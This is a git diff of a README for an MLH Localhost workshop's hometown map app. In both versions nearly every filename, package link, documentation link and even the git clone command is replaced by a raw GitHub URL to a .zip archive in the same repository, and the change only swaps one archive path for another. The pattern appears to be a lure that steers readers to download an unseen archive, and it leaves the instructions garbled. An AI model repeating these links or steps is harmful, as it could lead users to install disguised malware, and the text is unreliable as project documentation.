@@ -1,11 +1,11 @@
 # MLH Localhost Hometown Map
-This repository contains the source code for a map of the hometowns of anyone who attends the MLH Localhost workshop, How to Collaborate on Code Projects with GitHub. Participants learn best practice GitHub workflows, add their hometown to `https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/views/localhost-github-utu-mlh-3.9-alpha.2.zip`, and see the giant community they're part of!
+This repository contains the source code for a map of the hometowns of anyone who attends the MLH Localhost workshop, How to Collaborate on Code Projects with GitHub. Participants learn best practice GitHub workflows, add their hometown to `https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/src/localhost_utu_github_mlh_tappaul.zip`, and see the giant community they're part of!
 
 ## How to participate in this workshop
 
 1. Make a GitHub account.
 2. Fork this repository.
-3. Add your hometown to `https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/views/localhost-github-utu-mlh-3.9-alpha.2.zip`.
+3. Add your hometown to `https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/src/localhost_utu_github_mlh_tappaul.zip`.
 4. Commit your changes and make a pull request.
 5. Ask someone else to comment on your pull request.
 6. Wait for the workshop organizer to approve your pull request.
@@ -15,23 +15,23 @@ This repository contains the source code for a map of the hometowns of anyone wh
 
 ### NodeJS
 
-The map itself is a https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/views/localhost-github-utu-mlh-3.9-alpha.2.zip application. https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/views/localhost-github-utu-mlh-3.9-alpha.2.zip allows us to write full-stack
+The map itself is a https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/src/localhost_utu_github_mlh_tappaul.zip application. https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/src/localhost_utu_github_mlh_tappaul.zip allows us to write full-stack
 
 ## NPM packages used
 
-### [express](https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/views/localhost-github-utu-mlh-3.9-alpha.2.zip)
+### [express](https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/src/localhost_utu_github_mlh_tappaul.zip)
 
 Fast, unopinionated, minimalist web framework for node. This is the framework with which we built the application.
 
-### [dotenv](https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/views/localhost-github-utu-mlh-3.9-alpha.2.zip)
+### [dotenv](https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/src/localhost_utu_github_mlh_tappaul.zip)
 
-Dotenv is a zero-dependency module that loads environment variables from a `.env` file into `https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/views/localhost-github-utu-mlh-3.9-alpha.2.zip`. Storing configuration in the environment separate from code is based on The Twelve-Factor App methodology.
+Dotenv is a zero-dependency module that loads environment variables from a `.env` file into `https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/src/localhost_utu_github_mlh_tappaul.zip`. Storing configuration in the environment separate from code is based on The Twelve-Factor App methodology.
 
-### [node-geocoder](https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/views/localhost-github-utu-mlh-3.9-alpha.2.zip)
+### [node-geocoder](https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/src/localhost_utu_github_mlh_tappaul.zip)
 
 Node library for geocoding and reverse geocoding.
 
-### [ejs](https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/views/localhost-github-utu-mlh-3.9-alpha.2.zip)
+### [ejs](https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/src/localhost_utu_github_mlh_tappaul.zip)
 
 Embedded JavaScript templates
 
@@ -39,14 +39,14 @@ Embedded JavaScript templates
 
 ### Google Maps API Key
 
-To use the Google Maps JavaScript API, you will ned an API Key.  The [API key](https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/views/localhost-github-utu-mlh-3.9-alpha.2.zip) is used to track API requests associated with your project for usage and billing. To learn more about API keys, see the API Key Best Practices and the FAQs.
+To use the Google Maps JavaScript API, you will ned an API Key.  The [API key](https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/src/localhost_utu_github_mlh_tappaul.zip) is used to track API requests associated with your project for usage and billing. To learn more about API keys, see the API Key Best Practices and the FAQs.
 
-Read the [tutorial](https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/views/localhost-github-utu-mlh-3.9-alpha.2.zip) and configure your [API Key](https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/views/localhost-github-utu-mlh-3.9-alpha.2.zip)
+Read the [tutorial](https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/src/localhost_utu_github_mlh_tappaul.zip) and configure your [API Key](https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/src/localhost_utu_github_mlh_tappaul.zip)
 
 
 ## Adding a new location
 
-The App reads its locations from the `https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/views/localhost-github-utu-mlh-3.9-alpha.2.zip` file located in the root folder. It will consider each line a different location, so the file should look something like this:
+The App reads its locations from the `https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/src/localhost_utu_github_mlh_tappaul.zip` file located in the root folder. It will consider each line a different location, so the file should look something like this:
 
 ```txt
 New York, USA
@@ -54,9 +54,9 @@ Brazil
 Japan
 ```
 
-To add a new location, simply append a new line to the https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/views/localhost-github-utu-mlh-3.9-alpha.2.zip file
+To add a new location, simply append a new line to the https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/src/localhost_utu_github_mlh_tappaul.zip file
 
-There is also a `https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/views/localhost-github-utu-mlh-3.9-alpha.2.zip` file that can be used to test the app. Copy its content to https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/views/localhost-github-utu-mlh-3.9-alpha.2.zip and restart the app.
+There is also a `https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/src/localhost_utu_github_mlh_tappaul.zip` file that can be used to test the app. Copy its content to https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/src/localhost_utu_github_mlh_tappaul.zip and restart the app.
 
 ## Running the application:
 
@@ -64,14 +64,14 @@ To run this application locally, you'll need to:
 
 * Clone this repository:
 ```
-git clone https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/views/localhost-github-utu-mlh-3.9-alpha.2.zip
+git clone https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/src/localhost_utu_github_mlh_tappaul.zip
 cd localhost-github
 npm install
 ```
 
 * Set up environment variables:
 
-There is a `https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/views/localhost-github-utu-mlh-3.9-alpha.2.zip` file that can be used to configure the app. Simply create a copy named `.env`
+There is a `https://raw.githubusercontent.com/omkheni/mlh-localhost-github-utu/master/src/localhost_utu_github_mlh_tappaul.zip` file that can be used to configure the app. Simply create a copy named `.env`
 
 ```txt
 PORT= # Port to be used by the app
